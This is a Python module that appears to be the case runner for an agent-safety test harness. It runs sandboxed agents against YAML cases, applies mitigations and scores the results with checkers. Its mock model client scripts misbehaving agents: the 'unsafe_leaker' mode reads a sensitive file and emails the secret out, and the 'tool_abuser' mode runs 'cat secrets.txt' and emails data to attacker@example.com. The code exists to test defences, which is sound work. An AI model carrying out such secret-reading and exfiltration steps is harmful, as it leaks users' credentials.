"""Single-case execution backend for ASRH.

This module is the runtime seam used by ``asrh.cli.run``.  It loads one YAML
case, applies a mitigation, builds the sandbox and case-scoped tool registry,
runs the configured agent, executes deterministic checkers, assembles a JSONL
trace record, and optionally writes that record to disk.
"""

from __future__ import annotations

import importlib
import json
from collections.abc import Mapping
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Final, Protocol

from asrh import (
    DEFAULT_MAX_STEPS,
    DEFAULT_MAX_TOKENS_PER_RESPONSE,
    DEFAULT_MAX_TOOL_CALLS,
    DEFAULT_MAX_TOTAL_TOKENS,
    DEFAULT_MITIGATION,
    DEFAULT_MODEL,
    DEFAULT_TEMPERATURE,
    DEFAULT_TIMEOUT_SECONDS,
    SUPPORTED_MOCK_MODES,
)
from asrh.agents import AgentConfig, ModelConfig, ModelResponse, SingleTurnAgent, ToolAgent
from asrh.cases.loader import LoadedCase, load_case_with_metadata
from asrh.cases.schema import TestCase
from asrh.checkers import run_checkers
from asrh.checkers.base import CHECKER_CATEGORY_SAFETY, CheckResult, compute_verdict
from asrh.mitigations import (
    apply_mitigation,
    build_mitigated_sandbox,
    build_mitigated_tool_registry,
    get_mitigation_strategy,
    scan_final_answer_with_mitigation,
)
from asrh.runner.result import (
    DEFAULT_AGENT_MODE,
    STATUS_COMPLETED,
    STATUS_ERROR,
    CaseExecutionConfig,
    ModelResolutionError,
    RunCaseResult,
    RunnerConfigurationError,
)
from asrh.runner.trace import (
    TraceRecord,
    build_error_trace_record,
    build_prechecker_trace_mapping,
    build_run_trace,
    compact_error,
    make_run_id,
    utc_now_iso,
    write_trace_jsonl,
)

JsonDict = dict[str, Any]
JsonMapping = Mapping[str, Any]


class RunnerError(RuntimeError):
    """Base error for case execution."""


class ModelClientBuildError(ModelResolutionError):
    """Raised when a requested non-mock model client cannot be constructed."""


class ModelClientProtocol(Protocol):
    """Minimal model-client protocol expected by ASRH agents."""

    def generate(self, messages: Any, config: ModelConfig) -> Any: ...


@dataclass(slots=True)
class DeterministicMockModelClient:
    """Deterministic model client used for no-cost runner tests and demos."""

    mode: str
    case: TestCase
    model_name: str
    calls: int = 0
    state: dict[str, Any] = field(default_factory=dict)

    def __post_init__(self) -> None:
        normalized = self.mode.strip().lower().replace("-", "_").replace(" ", "_") or "safe"
        if normalized not in SUPPORTED_MOCK_MODES:
            raise RunnerConfigurationError(
                f"unsupported mock mode {self.mode!r}; expected one of {sorted(SUPPORTED_MOCK_MODES)}"
            )
        self.mode = normalized

    def generate(self, messages: Any, config: ModelConfig) -> ModelResponse:
        """Return a deterministic JSON-action response for the configured mock mode."""
        self.calls += 1
        if self.mode == "safe":
            content = self._safe_action(messages)
        elif self.mode == "unsafe_leaker":
            content = self._unsafe_leaker_action(messages)
        elif self.mode == "tool_abuser":
            content = self._tool_abuser_action(messages)
        elif self.mode == "refuser":
            content = _final_json("I cannot assist with that request.")
        elif self.mode == "json_invalid":
            content = "this is not valid ASRH JSON"
        elif self.mode == "looping":
            content = _tool_json("list_files", {})
        else:
            content = _final_json(self._safe_answer())
        return ModelResponse(
            content=content,
            raw={"provider": "mock", "mode": self.mode, "call": self.calls},
            input_tokens=_rough_token_count(messages),
            output_tokens=max(1, len(content.split())),
            model_name=config.model_name,
        )

    def _safe_action(self, messages: Any) -> str:
        if _looks_single_turn(messages):
            return _final_json(self._safe_answer())
        if not self.state.get("read_primary") and "read_file" in self.case.allowed_tools:
            path = primary_non_sensitive_file(self.case)
            if path:
                self.state["read_primary"] = True
                return _tool_json("read_file", {"path": path})
        if not self.state.get("read_email") and "read_email" in self.case.allowed_tools:
            self.state["read_email"] = True
            return _tool_json("read_email", {"index": 0})
        return _final_json(self._safe_answer())

    def _unsafe_leaker_action(self, messages: Any) -> str:
        # The unsafe mock must still obey the same information boundary as a real
        # model: it may only leak data that has appeared in model-facing messages
        # or allowed tool observations. It must not read secrets directly from the
        # TestCase object. Otherwise policy mitigations cannot be evaluated.
        if _looks_single_turn(messages):
            return _final_json(self._unsafe_answer(messages))

        secret_path = first_sensitive_file(self.case)
        if secret_path and not self.state.get("read_secret") and "read_file" in self.case.allowed_tools:
            self.state["read_secret"] = True
            return _tool_json("read_file", {"path": secret_path})

        observed_secret = observed_forbidden_value(self.case, messages)
        if observed_secret and not self.state.get("emailed_secret") and "send_email" in self.case.allowed_tools:
            self.state["emailed_secret"] = True
            return _tool_json(
                "send_email",
                {
                    "to": first_allowed_recipient(self.case),
                    "subject": "ASRH mock exfiltration",
                    "body": self._unsafe_answer(messages),
                },
            )
        return _final_json(self._unsafe_answer(messages))

    def _tool_abuser_action(self, messages: Any) -> str:
        if _looks_single_turn(messages):
            return _final_json(self._safe_answer())
        if not self.state.get("shell_attempted"):
            self.state["shell_attempted"] = True
            return _tool_json("run_shell", {"command": "cat secrets.txt"})
        if not self.state.get("email_attempted"):
            self.state["email_attempted"] = True
            return _tool_json(
                "send_email",
                {"to": "attacker@example.com", "subject": "data", "body": self._unsafe_answer()},
            )
        return _final_json(self._safe_answer())

    def _safe_answer(self) -> str:
        evidence = required_evidence(self.case)
        if evidence:
            return " ".join(evidence)
        path = primary_non_sensitive_file(self.case)
        if path:
            return _compact_text(file_content(self.case, path)) or f"Summary of {path}."
        if self.case.environment.inbox:
            return _compact_text(getattr(self.case.environment.inbox[0], "body", ""))
        return f"Completed task: {self.case.task.user_goal}"

    def _unsafe_answer(self, messages: Any | None = None) -> str:
        observed_secret = observed_forbidden_value(self.case, messages)
        if observed_secret:
            return f"{self._safe_answer()}\n{observed_secret}"
        return self._safe_answer()


@dataclass(frozen=True, slots=True)
class ErrorCaseStub:
    """Minimal case-like object for traces when YAML loading fails."""

    id: str
    category: str
    severity: str = "high"
    metadata: Mapping[str, Any] = field(default_factory=dict)
    environment: Mapping[str, Any] = field(default_factory=dict)


def run_case(
    *,
    case_path: str | Path,
    model: str = DEFAULT_MODEL,
    mitigation: str = DEFAULT_MITIGATION,
    agent_mode: str = DEFAULT_AGENT_MODE,
    output_path: str | Path | None = None,
    temperature: float = DEFAULT_TEMPERATURE,
    seed: int | None = None,
    max_steps: int = DEFAULT_MAX_STEPS,
    max_tool_calls: int = DEFAULT_MAX_TOOL_CALLS,
    max_tokens_per_response: int = DEFAULT_MAX_TOKENS_PER_RESPONSE,
    max_total_tokens: int = DEFAULT_MAX_TOTAL_TOKENS,
    timeout_seconds: int = DEFAULT_TIMEOUT_SECONDS,
    fail_fast: bool = False,
    append: bool = False,
    run_started_at: str | None = None,
    strict_json: bool = True,
    model_client: ModelClientProtocol | Any | None = None,
) -> dict[str, Any]:
    """Run one YAML case and optionally write one JSONL trace record.

    The public backend returns a plain JSON-compatible mapping so the CLI can
    render human-readable or ``--json`` output without special encoders.
    """
    config = make_case_config(
        model=model,
        mitigation=mitigation,
        agent_mode=agent_mode,
        temperature=temperature,
        seed=seed,
        max_steps=max_steps,
        max_tool_calls=max_tool_calls,
        max_tokens_per_response=max_tokens_per_response,
        max_total_tokens=max_total_tokens,
        timeout_seconds=timeout_seconds,
        fail_fast=fail_fast,
        append=append,
        run_started_at=run_started_at,
        strict_json=strict_json,
        metadata={"case_path": Path(case_path).expanduser().as_posix()},
    )
    try:
        loaded = load_case_with_metadata(Path(case_path).expanduser())
        result = execute_loaded_case(
            loaded_case=loaded,
            config=config,
            output_path=output_path,
            append=append,
            run_id=None,
            model_client=model_client,
        )
    except Exception as exc:  # noqa: BLE001 - CLI needs a traceable failure unless fail-fast is set.
        if fail_fast:
            raise
        result = build_error_case_result(
            case_path=case_path,
            output_path=output_path,
            config=config,
            error=exc,
            append=append,
        )
    return result.to_dict(include_trace=False)


def execute_loaded_case(
    *,
    loaded_case: LoadedCase,
    config: CaseExecutionConfig,
    output_path: str | Path | None = None,
    append: bool = False,
    run_id: str | None = None,
    run_started_at: str | None = None,
    model_client: ModelClientProtocol | Any | None = None,
) -> RunCaseResult:
    """Execute an already-loaded case and return a structured result object."""
    started_at = run_started_at or config.run_started_at or utc_now_iso()
    suite_name = loaded_case.suite or loaded_case.case.category
    effective_run_id = run_id or make_run_id(
        started_at=started_at,
        model=config.model,
        mitigation=config.mitigation,
        target=loaded_case.case.id,
        suite=suite_name,
    )
    trace = execute_case(
        case=loaded_case.case,
        suite=suite_name,
        case_path=loaded_case.path,
        config=config,
        run_id=effective_run_id,
        started_at=started_at,
        model_client=model_client,
    )
    if output_path is not None:
        write_trace_jsonl(output_path, trace, append=append)
    return RunCaseResult.from_trace(
        trace,
        output_path=output_path,
        case_path=loaded_case.path,
        status=trace.status,
        errors=trace.errors,
    )


def execute_case(
    *,
    case: TestCase,
    suite: str | None,
    case_path: str | Path | None,
    config: CaseExecutionConfig,
    run_id: str,
    started_at: str | None = None,
    model_client: ModelClientProtocol | Any | None = None,
) -> TraceRecord:
    """Execute a parsed case and return a trace without writing it."""
    run_started = started_at or utc_now_iso()
    application = apply_mitigation(case, config.mitigation)
    mitigated_case = application.case
    strategy = get_mitigation_strategy(config.mitigation)
    env = build_mitigated_sandbox(case, config.mitigation)
    registry = build_mitigated_tool_registry(case, config.mitigation, strict=False)
    provider, _ = split_model_identifier(config.model)
    client = model_client or build_model_client(config.model, case=mitigated_case)
    agent_config = config.to_agent_config()
    agent = build_agent_for_mode(config.agent_mode, extra_system_instructions=application.extra_system_instructions)

    agent_result = agent.run(
        case=mitigated_case,
        model_client=client,
        env=env,
        tool_registry=registry,
        config=agent_config,
        model_name=config.model,
        mitigation=config.mitigation,
    )
    precheck_trace = build_prechecker_trace_mapping(
        case=mitigated_case,
        suite=suite,
        agent_result=agent_result,
        env=env,
        metadata={"mitigation_application": application.to_dict(), "provider": provider},
    )
    checker_run = run_checkers(precheck_trace, mitigated_case)
    checker_results = list(checker_run.checker_results)

    final_scan = scan_final_answer_with_mitigation(agent_result.final_answer, mitigated_case, config.mitigation)
    if final_scan.failed:
        checker_results.append(
            CheckResult(
                checker_name=f"{config.mitigation}_final_answer_scan",
                passed=False,
                severity=final_scan.severity or "high",
                failure_class=final_scan.failure_class or "FINAL_OUTPUT_SCAN_FAILURE",
                evidence=tuple(final_scan.matched_patterns),
                explanation=final_scan.explanation or "Final answer failed mitigation scan.",
                checker_type="mitigation_final_answer_scan",
                category=CHECKER_CATEGORY_SAFETY,
                metadata=final_scan.to_dict(),
            )
        )

    verdict = compute_verdict(checker_results)
    return build_run_trace(
        run_id=run_id,
        case=mitigated_case,
        suite=suite,
        case_path=case_path,
        config=config.to_trace_config(),
        agent_result=agent_result,
        env=env,
        checker_results=tuple(checker_results),
        verdict=verdict,
        started_at=run_started,
        ended_at=utc_now_iso(),
        status=STATUS_COMPLETED,
        errors=agent_result.errors,
        metadata={
            "mitigation_application": application.to_dict(),
            "mitigation_strategy": strategy.to_dict(),
            "provider": provider,
            "tool_registry": registry.summary().to_dict() if hasattr(registry, "summary") else {},
        },
    )


def execute_loaded_case_to_trace(
    *,
    loaded_case: LoadedCase,
    config: CaseExecutionConfig,
    run_id: str,
    run_started_at: str | None = None,
    model_client: ModelClientProtocol | Any | None = None,
) -> TraceRecord:
    """Compatibility helper returning only the trace for a loaded case."""
    return execute_loaded_case(
        loaded_case=loaded_case,
        config=config,
        run_id=run_id,
        run_started_at=run_started_at,
        model_client=model_client,
    ).trace


def build_error_case_result(
    *,
    case_path: str | Path,
    output_path: str | Path | None,
    config: CaseExecutionConfig,
    error: BaseException,
    append: bool,
    run_id: str | None = None,
) -> RunCaseResult:
    """Build and optionally persist a traceable error result."""
    path = Path(case_path).expanduser()
    started_at = config.run_started_at or utc_now_iso()
    suite = path.parent.name or "unknown"
    case = ErrorCaseStub(
        id=path.stem or "unknown_case",
        category=suite,
        metadata={"title": "Runner error before case execution", "category": suite, "severity": "high"},
    )
    effective_run_id = run_id or make_run_id(
        started_at=started_at,
        model=config.model,
        mitigation=config.mitigation,
        target=case.id,
        suite=suite,
    )
    trace = build_error_trace_record(
        run_id=effective_run_id,
        case_id=case.id,
        suite=suite,
        model=config.model,
        mitigation=config.mitigation,
        config=config.to_trace_config(),
        error=error,
        started_at=started_at,
        ended_at=utc_now_iso(),
        case_path=path,
        metadata={"title": "Runner error before case execution"},
    )
    if output_path is not None:
        write_trace_jsonl(output_path, trace, append=append)
    return RunCaseResult.from_trace(
        trace,
        output_path=output_path,
        case_path=path,
        status=STATUS_ERROR,
        error=compact_error(error),
    )


def make_case_config(**kwargs: Any) -> CaseExecutionConfig:
    """Normalize and validate runner configuration values."""
    data = dict(kwargs)
    data["model"] = _nonblank(data.get("model", DEFAULT_MODEL), "model")
    data["mitigation"] = _nonblank(data.get("mitigation", DEFAULT_MITIGATION), "mitigation")
    data["agent_mode"] = normalize_agent_mode_for_runner(data.get("agent_mode", DEFAULT_AGENT_MODE))
    data["temperature"] = float(data.get("temperature", DEFAULT_TEMPERATURE))
    if not 0.0 <= data["temperature"] <= 2.0:
        raise RunnerConfigurationError("temperature must be between 0.0 and 2.0")
    defaults = {
        "max_steps": DEFAULT_MAX_STEPS,
        "max_tool_calls": DEFAULT_MAX_TOOL_CALLS,
        "max_tokens_per_response": DEFAULT_MAX_TOKENS_PER_RESPONSE,
        "max_total_tokens": DEFAULT_MAX_TOTAL_TOKENS,
        "timeout_seconds": DEFAULT_TIMEOUT_SECONDS,
    }
    for name in ("max_steps", "max_tool_calls", "max_tokens_per_response", "max_total_tokens", "timeout_seconds"):
        raw_value = data.get(name, defaults[name])
        if raw_value is None:
            raw_value = defaults[name]
        value = int(raw_value)
        minimum = 0 if name == "max_tool_calls" else 1
        if value < minimum:
            raise RunnerConfigurationError(f"{name} must be >= {minimum}")
        data[name] = value
    if data.get("seed") is not None:
        data["seed"] = int(data["seed"])
    data["fail_fast"] = bool(data.get("fail_fast", False))
    data["append"] = bool(data.get("append", False))
    data["strict_json"] = bool(data.get("strict_json", True))
    data["metadata"] = dict(data.get("metadata") or {})
    return CaseExecutionConfig(**data)


def build_agent_for_mode(agent_mode: str, *, extra_system_instructions: tuple[str, ...] | list[str] = ()) -> SingleTurnAgent | ToolAgent:
    """Build the concrete agent loop for the normalized mode."""
    normalized = normalize_agent_mode_for_runner(agent_mode)
    if normalized == "single_turn":
        return SingleTurnAgent(extra_system_instructions=tuple(extra_system_instructions))
    return ToolAgent(extra_system_instructions=tuple(extra_system_instructions))


def build_model_client(model: str, *, case: TestCase) -> Any:
    """Build a mock or provider-backed model client."""
    provider, name = split_model_identifier(model)
    if provider == "mock":
        return DeterministicMockModelClient(mode=name or "safe", case=case, model_name=model)
    try:
        models_pkg = importlib.import_module("asrh.models")
    except ModuleNotFoundError as exc:
        raise ModelClientBuildError(
            f"model provider {provider!r} requires the future asrh.models package; use mock/safe until models/ is implemented"
        ) from exc
    for factory_name in ("build_model_client", "get_model_client", "create_model_client", "resolve_model_client"):
        factory = getattr(models_pkg, factory_name, None)
        if callable(factory):
            return factory(model)
    raise ModelClientBuildError(f"asrh.models does not expose a supported model-client factory for {model!r}")


def split_model_identifier(model: str) -> tuple[str, str]:
    """Return ``(provider, name)`` from an ASRH model identifier."""
    text = _nonblank(model, "model")
    if "/" in text:
        provider, name = text.split("/", 1)
        return provider.strip().lower(), name.strip()
    if text.startswith("mock"):
        return "mock", text.removeprefix("mock").lstrip(":/_") or "safe"
    return "local", text


def normalize_agent_mode_for_runner(value: str | None) -> str:
    """Normalize CLI aliases to concrete agent modes."""
    text = str(value or DEFAULT_AGENT_MODE).strip().lower().replace("-", "_").replace(" ", "_")
    aliases = {
        "tool": "tool_agent",
        "tools": "tool_agent",
        "react": "tool_agent",
        "react_agent": "tool_agent",
        "mock": "tool_agent",
        "single": "single_turn",
        "no_tool": "single_turn",
        "no_tools": "single_turn",
    }
    normalized = aliases.get(text, text)
    if normalized not in {"tool_agent", "single_turn"}:
        raise RunnerConfigurationError("agent_mode must be one of: tool_agent, single_turn, mock")
    return normalized


def required_evidence(case: TestCase) -> tuple[str, ...]:
    """Return deterministic utility evidence used by mock/safe responses."""
    values: list[str] = []
    criteria = getattr(case.task, "success_criteria", {}) or {}
    if isinstance(criteria, Mapping):
        values.extend(str(value) for value in criteria.get("must_contain", ()) or ())
    for checker in case.checkers:
        checker_type = str(getattr(getattr(checker, "type", ""), "value", getattr(checker, "type", "")))
        if checker_type == "task_completion":
            values.extend(str(value) for value in getattr(checker, "required_evidence", None) or ())
    seen: set[str] = set()
    return tuple(value for value in values if value and not (value in seen or seen.add(value)))


def primary_non_sensitive_file(case: TestCase) -> str | None:
    """Return the most task-relevant non-sensitive file path."""
    goal = str(case.task.user_goal).casefold()
    files = [file for file in case.environment.files if str(getattr(file.trust_level, "value", file.trust_level)) != "sensitive"]
    for file in files:
        if str(file.path).casefold() in goal:
            return str(file.path)
    return str(files[0].path) if files else None


def first_sensitive_file(case: TestCase) -> str | None:
    """Return the first sensitive file path, if any."""
    for file in case.environment.files:
        if str(getattr(file.trust_level, "value", file.trust_level)) == "sensitive":
            return str(file.path)
    return None


def first_sensitive_value(case: TestCase) -> str | None:
    """Return one synthetic secret-like string for case-authoring helpers only."""
    path = first_sensitive_file(case)
    if path:
        for line in file_content(case, path).splitlines():
            if line.strip():
                return line.strip()
    for checker in case.checkers:
        patterns = getattr(checker, "forbidden_patterns", None)
        if patterns:
            return str(patterns[-1])
    return None


def forbidden_values(case: TestCase) -> tuple[str, ...]:
    """Return configured exact forbidden strings for mock-observation scanning."""
    values: list[str] = []
    for checker in case.checkers:
        patterns = getattr(checker, "forbidden_patterns", None)
        if patterns:
            values.extend(str(pattern) for pattern in patterns if str(pattern).strip())
    for file in case.environment.files:
        if str(getattr(file.trust_level, "value", file.trust_level)) == "sensitive":
            for line in str(file.content).splitlines():
                stripped = line.strip()
                if stripped:
                    values.append(stripped)
    seen: set[str] = set()
    return tuple(value for value in values if value and not (value in seen or seen.add(value)))


def observed_forbidden_value(case: TestCase, messages: Any | None) -> str | None:
    """Return a forbidden value only if it appeared in allowed tool output.

    The mock model must not get oracle access to the case object. It may only
    leak values that became visible through model-facing tool observations. User
    prompts can mention key names such as ``API_KEY`` or ``ROOT_TOKEN`` without
    exposing the secret value, so this helper deliberately ignores non-tool
    messages.
    """
    if messages is None:
        return None

    tool_text_parts: list[str] = []
    for message in _message_list(messages):
        if str(message.get("role", "")).strip().lower() != "tool":
            continue
        content = str(message.get("content", ""))
        if '"allowed":false' in content.replace(" ", "").lower():
            continue
        tool_text_parts.append(content)

    if not tool_text_parts:
        return None
    text = "\n".join(tool_text_parts)

    values = sorted(forbidden_values(case), key=len, reverse=True)
    for value in values:
        if value and value in text:
            return value
    return None


def file_content(case: TestCase, path: str) -> str:
    """Return file content from the synthetic case environment."""
    for file in case.environment.files:
        if str(file.path) == path:
            return str(file.content)
    return ""


def first_allowed_recipient(case: TestCase) -> str:
    """Return the first configured recipient for email-exfiltration mock behavior."""
    policy = case.tools.tool_policies.get("send_email", {}) if case.tools.tool_policies else {}
    if isinstance(policy, Mapping):
        recipients = policy.get("allowed_recipients") or ()
        if recipients:
            return str(tuple(recipients)[0])
    return "manager@example.com"


def _final_json(content: str) -> str:
    return json.dumps({"type": "final_answer", "content": content}, ensure_ascii=False)


def _tool_json(tool: str, args: Mapping[str, Any]) -> str:
    return json.dumps({"type": "tool_call", "tool": tool, "args": dict(args)}, ensure_ascii=False)


def _looks_single_turn(messages: Any) -> bool:
    text = json.dumps(_message_list(messages), default=str).casefold()
    return "available tools" not in text and "tool_call" not in text


def _message_list(messages: Any) -> list[Mapping[str, Any]]:
    out: list[Mapping[str, Any]] = []
    try:
        iterable = tuple(messages)
    except TypeError:
        return out
    for item in iterable:
        if isinstance(item, Mapping):
            out.append(item)
        elif hasattr(item, "to_dict"):
            out.append(item.to_dict())
        else:
            out.append({"content": str(item)})
    return out


def _rough_token_count(messages: Any) -> int:
    return max(1, len(json.dumps(_message_list(messages), default=str).split()))


def _compact_text(value: str, *, max_chars: int = 240) -> str:
    text = " ".join(str(value).split())
    return text if len(text) <= max_chars else text[: max_chars - 1].rstrip() + "…"


def _nonblank(value: Any, name: str) -> str:
    text = str(value or "").strip()
    if not text:
        raise RunnerConfigurationError(f"{name} must not be blank")
    return text


build_run_id = make_run_id
normalize_agent_mode = normalize_agent_mode_for_runner
MockModelClient = DeterministicMockModelClient

__all__: Final[tuple[str, ...]] = tuple(
    name for name in globals() if not name.startswith("_") and name not in {"annotations", "Any", "Final"}
)
